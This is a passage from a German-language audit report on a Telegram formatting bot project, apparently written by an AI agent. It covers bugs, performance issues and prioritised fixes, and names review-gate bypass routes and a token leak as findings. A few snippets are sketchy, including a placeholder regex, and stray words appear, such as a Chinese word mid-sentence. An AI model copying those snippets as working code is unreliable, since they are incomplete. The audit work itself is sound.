**Auswirkung:** Jede lange Nachricht mit Formatierung (fett/kursiv/code/formula) auf dem Regular- oder Rich-Pfad ist unzustellbar. Das ist der Kern-Use-Case des Projekts („KI-Antwort > 4096 Zeichen kopieren → senden").

**Lösung (robusteste Option):** Chunking **vor** der Serialisierung auf Segment-Ebene (Parser-Struktur ist ja vorhanden: `split_formulas` + Absatzblöcke), dann je Chunk serialisieren; bei Überlappung Tags pro Chunk reparieren:

```python
def balance_html(chunk: str) -> str:
    """Offene Telegram-Tags über Chunkgrenzen hinretten."""
    opens = re.findall(r"<(b|i|u|s|code|pre|blockquote)\b[^>]*>", chunk)
    closes = re.findall(r"</(\1)>", chunk)   # sinngemäß; Zähl-Impl. mit Stack
    ...  # nicht geschlossene öffnen Tags anhängen; überzählige schließende
         # auf Chunk-Anfang als Wiedereröffenung vorziehen
```

Zusätzlich: Chunks, die ein `~ ~~-Fence oder `$$` öffnen, müssen dieses bis Chunk-Ende schließen und im nächsten neu öffnen (LaTeX-Blöcke ggf. ganz in den nächsten Chunk schieben — `chunk_text` kennt bereits Absatzgrenzen; hier nur Zeilengrenzen erlauben, wenn `$$`-Balance ≠ 0).

---

### B-2 🟠 `botctl send --local-trust` ist vollständig defekt (dokumentierter Standardpfad)
**Dateien:** `botctl.py:246–268`, `botkit/session.py:353–366`

`--local-trust` setzt `require_review=False`, **aber** `SessionManager.open` prüft im `elif`-Zweig zusätzlich `self._gate is not None` (`session.py:365`) — `cmd_send` übergibt den Gate aber immer (`botctl.py:268`). Da `registry.register()` den Bot nur als `PENDING` anlegt und im Local-Modus nie jemand `mark_approved` aufruft, scheitert **jeder** `--local-trust`-Send:

**Verifikation (reproduziert):**
```
⚠ --local-trust: Review wird übersprungen (nur für eigene, private Bots).
✖ Session nicht geöffnet: Bot ist nicht freigegeben (Status != approved).
Exit-Code: 1   (versendete Chunks: 0)
```

Die CLI-Hilfe selbst empfiehlt genau diesen Pfad („Für private/self-hosted Bots: `--local-trust`", `botctl.py:248–249`).

**Lösung:** `SessionManager.open` muss die `--local-trust`-Semantik abbilden — der Freigabe-Zwang darf nur greifen, wenn *tatsächlich* Review verlangt wird:

```python
# session.py:365 — elif auf den Registry-Modus ohne Gate-Teilnahme eingrenzen:
elif self._gate is not None and self._registry.get(token.bot_id).status \
        in (RegistrationStatus.REJECTED, RegistrationStatus.REVOKED):
    raise SessionError("Bot wurde abgelehnt/entzogen.")
```

(oder in `cmd_send` für den Local-Trust explizit `review_gate=None` übergeben — Einzeiler, `botctl.py:268`.) Dazu einen Test, der `main(["send", …, "--local-trust"])` mit gemocktem `get_me`/`send_message` **end-to-end** fährt — der fehlende Test hat den Bug durch alle 178 grünen Tests gebracht.

---

### B-3 🟠 Ab-Lehnung (Reject) invalidiert bestehende Freigaben nicht — Logik widerspricht Doku
**Dateien:** `botkit/review.py:486–497` (`ReviewTicket.is_approved`), `724–736` (`ReviewGate.reject`)

`reject()` dokumentiert „eine einzige Ablehnung invalidiert bestehende Freigaben"; `is_approved()` zählt aber nur `approvals` und ignoriert `rejections` vollständig. Im gehosteten Modus fängt die Registry das ab (`mark_rejected`); im **Local/Git-Modus** (`registry=None` — genau den nutzt `botctl`!) gibt es keine Gegenprüfung.

**Verifikation (reproduziert):** 2 Freigaben (1× Maintainer) → `gate.verify` PASSED → dritter Reviewer `reject()` → Ticket: `approvals=2, rejections=1` → `gate.verify` **weiterhin PASSED**.

**Auswirkung:** Ein abgelehnter Bot bleibt sessionfähig; Vier-Augen-Gate mit Undo-Loch.

**Lösung:**

```python
# review.py
def is_approved(self, *, min_approvals: int, require_maintainer: bool) -> bool:
    if self.rejections:
        return False          # jede Ablehnung blockiert, bis neu eingereicht wird
    ...
```

---

### B-4 🟡 Preis-/Dollar-Angaben werden als LaTeX fehlinterpretiert → falscher Sendepfad
**Dateien:** `utils.py:111–203` (`split_formulas`), `210+` (`convert_deepseek_latex_syntax`), `460+` (`_protect_math`)

Inline-Math-Erkennung prüft nur „kein Leerzeichen **nach** dem öffnenden `$`", aber nicht die GFM-Gegenregeln („kein Leerzeichen **vor** dem schließenden `$`", „kein Ziffernzeichen direkt danach"). Ergebnis: `Das Buch kostet $100 und der Stift $200.` → Segment `inline_math` → `needs_rich_message` True → Rich-Pfad → Telegram rendert „100 und" als Formel.

**Verifikation (reproduziert):** `build_messages("Das Buch kostet $100 und der Stift $200.", …)` → `kind: rich`.

**Lösung:** Abschlussklausel in allen drei Scannern (besser: gemeinsamer Scanner, s. O-3):

```python
ok_close = (
    text[end - 1] not in " \t\n"          # kein Whitespace vor schließendem $
    and not (end + 1 < n and text[end + 1].isdigit())  # "$100" vor "$200" danach = Preis
)
```

Zusätzlich: Inline-Formel darf nicht über `\n\n` (Absatzgrenze) reichen — aktuelle Implementierung paart `$` sonst über den halben Dokumenttext.

---

### B-5 🟡 Fehlende Typvalidierung: `{"text": 12345}` → unbehandelte 500 in beiden JSON-Endpunkten
**Datei:** `app.py:50–54, 75–80` → `utils.normalize_text` (`utils.py:74–86`)

`text` wird untypgeprüft in `build_messages` gereicht; `int.replace` → `AttributeError` → Flask-500 (HTML-Fehlerseite auf einen JSON-Client; Traceback im App-Log). Verifiziert: Status 500 bei `{"text": 12345}`. Analog `chat_id: {}` (B-2 von K-2 gilt auch für convert — dort nur Echo, daher niedriger).

**Lösung:** Validierung wie in K-2 skizziert (`isinstance(text, str)` → 400); für konsistente Fehlerformate zusätzlich `@app.errorhandler(500)` mit `jsonify`.

---

### Weitere Bugs (🟢 Niedrig)

- **B-6 · Teilversand ohne Rückmeldung** (`app.py:81–88`): schlägt Chunk *n* fehl, endet der Handler mit `return … 502` — die bereits gesendeten 1..n-1 quittiert er **nicht**; der Nutzer sieht nur „Fehler" und sendet komplett neu → Duplikate. Fix: `{"error":…, "sent": results}` (Status 207-artige Semantik) oder Abbruch-Grund + „Teile gesendet".
- **B-7 · `sender.py` ignoriert `retry_after` und `ok`-Flag**: 429 wird als generischer Fehler geworfen (Telegram liefert `parameters.retry_after` — genau das verlangt Checkliste C6 von Nutzer-Bots); `response.json()` ungesichert; `ok:false` bei HTTP 200 (Proxy-Szenario) wird als Erfolg gewertet. Fix: Body parsen, `SendError`-Subklassen `RateLimited(retry_after)`, Backoff im App-Sende-Loop (max 1 Retry).
- **B-8 · `botctl`-Robustheit:** `cmd_review` fängt `(SyntaxError, UnicodeDecodeError, ValueError)`, aber nicht `OSError` — Verzeichnis/Binary als Pfad → rohes Traceback (`IsADirectoryError`), obwohl genau dieser Crash-Klasse in `tests/test_botctl.py` begegnet werden soll. Zudem: `--owner`-Default `os.environ["USER"][:32]` (botctl.py Parser) kann `OWNER_REF_PATTERN` verletzen (Leerzeichen/Unicode) → verwirrende Meldung „Bot konnte nicht verifiziert werden". Fix: `OSError` in die Except-Liste; `--owner`-Fallback auf `"local"` validieren, sonst klaren Hinweis.
- **B-9 · Traceback bei `approve` nach `revoke`:** `gate.approve` → `registry.mark_approved` → `RegistrationError` (weder `ReviewError` noch `ValueError`) → Uncaught in `cmd_approve` (`botctl.py`). Fix: `except (ReviewError, RegistrationError)`.
- **B-10 · Lost Update im Audit-Trail:** zwei parallel laufende `botctl approve` lesen+überschreiben `audit/reviews.json`; die zweite `save()` verwirft die erste Entscheidung scheinbar (kein Lock, kein Append — entgegen „append-only"-Formulierung in `review.py:438`). Fix: `flock` um Load-Modify-Save (s. M-4d).
- **B-11 · Test-Isolation:** `tests/test_app.py::test_send_missing_token` setzt `app_module.BOT_TOKEN = ""` ohne Restore (Fixture-seitig) — bei geänderter Testreihenfolge laufen Folgetests gegen konfiguriert/nicht-konfiguriert-Falschzustand. Fix: Monkeypatch/Fixture mit Restore.
- **B-12 · Listen-Einrückung geht verloren** (`utils.py` Schritt 9: `^\s*[-*+]\s+` → `"• "` frisstleading whitespace): verschachtelte Listen werden flach. Kleiner Rendering-Bug, 1-Zeilen-Fix: Einrückung erfassen und als `Indent` rehydrieren.
- **B-13 · `BotSession.bot_id == -1` nach `close()`** und `__repr__` zeigt „expired" für geschlossene Sessions (is_expired prüft `closed` zuerst → repr-Logik zeigt `closed`-Zweig nicht sauber, `session.py:178–184`). Kosmetik.
- **B-14 · `has_table` akzeptiert Zwei-Zeilen-Pipes ohne Trennzeile** („x | y\nz | w" wird zur GFM-Tabelle mit Header „x y"): bewusste Toleranz, aber im Rich-Pfad ohne `---`-Zeile rendert Telegram sie als Tabelle, während der Autor zwei Textzeilen meinte — dokumentieren oder `min_rows>=3`/Separatorpflicht anbieten.

---

## 4. Optimierungsbedarf

### 4.1 Performance

- **O-1 · Mehrfache Volltext-Durchläufe pro Konvertierung:** `build_messages` → `normalize_text` (1. Mal) → `needs_rich_message` (`split_formulas` komplett + `has_table` mit `re.split` + `parse_pipe_table` je Block) → converter-Interner `normalize_text` (2. Mal) → `convert_deepseek_latex_syntax` (voll) → `_protect_math` (voll) → ggf. `re.split` auf Blöcke erneut. Gemessen: **~0,6 s CPU pro MB** — bei KI-typischen 50–200 kB vertretbar, in Kombination mit H-2 (kein Limit, jeder Tastendruck) aber der eigentliche DoS-Multiplikator. Fix: Ein-Pass-Tokenisierung — `split_formulas` einmal aufrufen, Ergebnis als `list[Segment]` durchreichen, `has_latex` daraus ableiten; `needs_rich_message` + `markdown_to_*` teilen sich den Parse-Tree.
- **O-2 · `_group` ist O(n²):** `len(joiner.join(buf))` wird für *jedes* Item neu berechnet (`utils.py:687`). Bei 10k Absätzen 50M+ Zeichenkopien. Fix: `total = sum(len(b) for b in buf) + len(joiner)*(len(buf)-1)` inkrementell führen.
- **O-3 · Duplizierte State-Machine:** `split_formulas`, `convert_deepseek_latex_syntax`, `_protect_math` sind drei handgemalte, leicht divergierende Zeichen-Scanner (~150 LOC, identische Mängel wie B-4/N-1). Fix: ein `iter_math_segments()` + dünne Wrapper;消灭 die Bug-Klasse „ein Pfad gefixt, zwei nicht".
- **O-4 · Kein HTTP-Session-Reuse:** `sender.send_message` öffnet pro Chunk neue TCP+TLS-Verbindung (`requests.post` direkt). Bei Multi-Chunk-Sends der dominante Latenzfaktor. Fix: modulweites `requests.Session` (Pool) oder `HTTPAdapter(pool_connections=4, max_retries=Retry(0))` — Retries bewusst aus, da idempotente Fehlerbehandlung fehlt (B-7).
- **O-5 · Frontend ohne Debounce/Caching** (`index.html` JS): jeder `input`-Event → `fetch /api/convert` mit vollem Text; bei 100 kB Tipp-Tempo ein Request pro Anschlag. Fix: `debounce(250ms)` + nur bei `input.value.length`-Delta > 20 senden; Initial-POST bei leerem Feld unterdrücken (aktuell POST bei PageLoad).
- **O-6 · Gunicorn-Konfiguration:** Doku-Startkommando ohne `--workers`/`--timeout` (Default 1×30 s, sync). Bei K-2-artigen Lasten oder Multi-Chunk-Sends (15 s × n > 30 s) killt der Master den Worker **mitten im Versand** → halboffener Zustand + Duplikate beim Retry. Fix: Doku auf `--workers 2 --timeout 120 --graceful-timeout 30`; langfristig Versand in Hintergrund-Job (Queue) mit Status-Endpunkt.

### 4.2 Code-Qualität / Wartbarkeit

- **O-7 · Architekturdopplung App-vs-botkit:** `botkit` validiert (Länge, Typ, chat_id via `validate_chat_id`), die Flask-App dupliziert den Versandpfad *ohne* diese Kontrollen (K-2, B-5). Konsequenz der Doku-Regel „Web-Layer ist nur dünne HTTP-Schicht": Die dünnste Schicht hat die wenigste Validierung. Fix: `/api/*` auf `botkit`-Primitives (SessionConfig/SessionError) aufsetzen — oder mindestens `validate_chat_id` + Längencheck wiederverwenden.
- **O-8 · Inkonsistente Fehlerklassen zwischenLAYERN:** `sender.SendError` (mit Leak) vs. `telegram_api.TelegramAPIError` (sauber) vs. `SessionError` — selbes Problem (Netzwerk zur Telegram-API), drei semantisch unterschiedliche, uneinheitlich gehärtete Implementierungen. Fix: Sender auf `telegram_api._post`-Logik refactorieren (bzw. gemeinsame `http_client`-Schicht); dann existiert der Leak nur noch an einer Stelle.
- **O-9 · Typisierung/Tests der API-Ränder:** `app.py` annotiert `-> tuple` (statt `flask.Response`), Tests decken die Pfade nicht ab, die zählen: keine Tests für Error-Bodies, Typ-Crashs, `--local-trust`, Reject-after-Approve, Gate-Bypasses (a–e). Konkret fehlende Regressionstests in `tests/test_review.py`: `importlib`/`tempfile`/Alias-Requests/AnnAssign — nach H-1-Fix sofort als Negativbeispiele in `tests/fixtures/insecure_bot.py` ergänzen (die Fixture-Datei ist genau dafür da und wächst billiger als jede Regel).
- **O-10 · Werkzeugkette:** Bandit läuft mit `-ll` (LOW unterdrückt) — die B104 nosecom-Kommentare und potentielle `assert`-Nutzung bleiben unsichtbar; Ruff-Select verzichtet auf `S` (flake8-bandit) und `SIM`; `pyproject` deklariert `target-version = "py311"` bei `requires-python >=3.10` (OK, aber IRONIE: README bewirbt 3.10, Ruff-UP-Regeln können 3.10-kontraproduktive Fixes vorschlagen). Empfehlung: `select += ["SIM", "C4", "RET"]`, CI-Bandit ohne `-ll` mit expliziten `#nosec`-Begründungen, `mypy --strict` für `botkit` (Cache-Ordner ist bereits in `.gitignore`, ein Job fehlt).
- **O-11 · API-Fakten-Bindung:** Die ganze Rich-Pfad-Logik hängt an „Bot API 10.1: Methode `sendRichMessage`, Feld `markdown`/`html`, 32.768 UTF-8-Zeichen". Solche Fakten veralten still. Empfehlung: Konstanten + Methodennamen in *einer* `telegram_spec.py` bündeln, CI-smoke-Test `getMe` gegen echte API (manuell opt-in via Secret) und im Changelog die geprüfte Bot-API-Version dokumentieren.

### 4.3 Technische Schulden / Doku

- **O-12 · Beworbene, aber unimplementierte Features:** `InMemoryTokenVault`-Cookie-Flow (N-5), `bots/`-Ordner ist eine leere README-Hülle, `audit/reviews.json` = `[]` obwohl der Prozess „gelebt" wird (CI bezieht sich darauf). Toter Code + Doku-Drift irritieren auditerende Dritte. Fix: Either-Implementierung oder als „experimentell" kennzeichnen (README-Tabelle mit Statusspalte).
- **O-13 · `MIGRATION.md`/`CHANGELOG.md`-Hygiene:** CHANGELOG listet Features, aber keine Sicherheitsänderungen explizit (CVE-relevante Dependency-Sprünge wie gunicorn 22→23 tauchen nicht als SECURITY-Eintrag auf) — für Nutzer des PyPI-Pakets wichtig. Vorgabe: `SECURITY.md`-Changelog-Sektion + GitHub-Security-Advisories bei Dep-Bumps mit CVE.
- **O-14 · Sprachmix** (Kommentare DE, IDs/Fehlertexte EN/DE gemischt, `REDACTED = "[redacted]"` vs. deutsche Meldungen): für ein offenes OSS-Projekt mit ggf. englischsprachigen Contributors konsistenter: öffentliche Fehlermeldungen EN, Doku/Diskussion DE oder umgekehrt — wichtig v. a. weil `SendError`-Texte Nutzern angezeigt werden (und über K-1/H-3 sogar geleakt werden, sollte der String nicht geheime Details enthalten).

---

## 5. Recommendations (priorisiert)

### P0 — sofort (bevor die gehostete Instanz läuft; Zeitaufwand ~2–4 h)
1. **Token-Leak schließen** (`sender.py:51/54`): Fehlermeldungen ohne Exception-/Body-Durchreichung (Snippet K-1); identisches Muster wie `telegram_api._post`.
2. **`/api/send` absichern** (K-2): `chat_id`-Override entfernen oder auf Whitelist beschränken; `validate_chat_id` + `isinstance(text, str)` + `MAX_INPUT_CHARS` anwenden; `MAX_CONTENT_LENGTH`; `flask-limiter`; einheitlicher JSON-Fehlerkanal (`@app.errorhandler`).
3. **Hotfix `--local-trust`** (B-2): `review_gate=None` in `cmd_send` (Einzeiler `botctl.py:268`) oder Session-Gate-Logik anpassen; **CI-Test** für den Pfad nachreichen.
4. **Falls die Render.com-Instanz öffentlich ist:** bis P0-Abschluss `TELEGRAM_BOT_TOKEN` dort entfernen oder Endpunkt deaktivieren (README-Sendepfad dokumentieren: „self-host only, until auth lands").

### P1 — diese Woche
5. **Review-Gate härten** (H-1): `visit_Constant`-Token-Scan; `importlib`/`tempfile`/`shutil` verbieten; Import-Alias-Auflösung; BK010 → Blocker bei HTTP-Calls mit nicht-telegram-URL; Reject invalidiert Approvals (B-3, 3-Zeilen-Fix + Test).
6. **Chunk-Syntax-Guards** (B-1): Segment-basiertes Chunken oder `balance_html`-Reparaturschritt; Telegram-400-Regressionstest über `build_messages`-Ausgaben (Tag-Balance je Chunk als Invariante — lässt sich generisch über alle `test_utils`-Cases als Property-Test gießen).
7. **Log-Härtung** (H-4): `exc_info`-Redaction im `RedactingFilter` (Snippet); `install_privacy_filters()` auch in `app.py` beim Import aufrufen, nicht nur in botctl/minimal_bot.
8. **Security-Header + SRI/Self-Hosting** (H-5) und `Origin`-Check (M-6).

### P2 — diesen Monat
9. **Dependencies/Supply-Chain** (M-5): gunicorn→26.x, requests→2.34.x, `uv lock`/`pip-compile --generate-hashes`, Dependabot aktivieren, urllib3 explizit pinnen.
10. **Prozess-Integrität des Gates** (M-4): CI-`botctl verify` aktivieren; Approvals an echte GitHub-Identities binden; zweiter CODEOWNER; `flock` im Ledger (B-10/B-11).
11. **Math/Preis-Erkennung** (B-4) + NUL-Strip (N-1) + Escape-Lücken `"` (M-1): gemeinsamer Scanner-Refactor (O-3) nutzt den Fix dreifach.
12. **Rate-Limit-Handling** (B-7): `retry_after` respektieren, `ok`-Flag prüfen, `response.json()` absichern; Doku-FAQ-Ziffer „429" mit Verhalten abgleichen.
13. **API-Härtung CLI** (M-2/M-3): `--token` durch `--token-env`/getpass ersetzen; HTTPS-Pflicht für `api_base` (Ausnahme localhost) in `sender.py`, `telegram_api.py`, `botctl`-Parser.

### P3 — kontinuierlich / Architektur
14. `botkit`-Validierungsprimitive in `app.py` wiederverwenden (O-7), Fehlerklassen vereinheitlichen (O-8), `mypy --strict` für `botkit`, Ruff-Bandit-Plugin + Bandit ohne `-ll` (O-10).
15. Performance-Pass (O-1/O-2/O-4/O-5/O-6) mit Benchmark-Gate im CI (50-kB-Realwelt-Doku < 150 ms Convert).
16. Sicherheits-TDD: Zu jedem Finding dieses Audits einen Regressionstest als Pflicht zum Fix-PR machen (die Fixture `tests/fixtures/insecure_bot.py` + `tests/test_app.py`-Fehlerpfade bieten die Infrastruktur bereits).
17. Bedrohungsmodell für „gehostete Bots" neu schreiben (M-4 letzter Absatz): AST-Review ≠ Isolation; wenn Code-Ausführung geplant ist, Process-/Network-Sandbox zur Pflicht machen, Review-Gate als *Ergänzung* dokumentieren.

### Verifizierung dieser Analyse
Alle mit „reproduziert" markierten Befunde wurden auf Basis von Commit `f955550` in einer sauberen Umgebung (Python 3.11, Flask 3.1.3, requests 2.34.x) ausgeführt; Ruff/Bandit/`pytest` (178 passed) dienten als Negativkontrolle. Reproduktionsskizzen stehen jeweils als Code-Snippet im Bericht; die P0-Punkte lassen sich mit einem Test „Response-Body darf kein `TOKEN` enthalten" bzw. „Exit-Code 0 bei `--local-trust`" binär belegen.

---

*Bericht: Arena Agent Mode, 2026-09-11. Bewertungen nach CVSS-orientierter Einschätzung im Bedrohungsmodell des Projekts (öffentlich gehostetes Tool + BYOB-Trust-Gate). Für Rückfragen zu einzelnen Findings: Dateiverweise sind Zeilen-precise (Stand des geprüften Commits).*
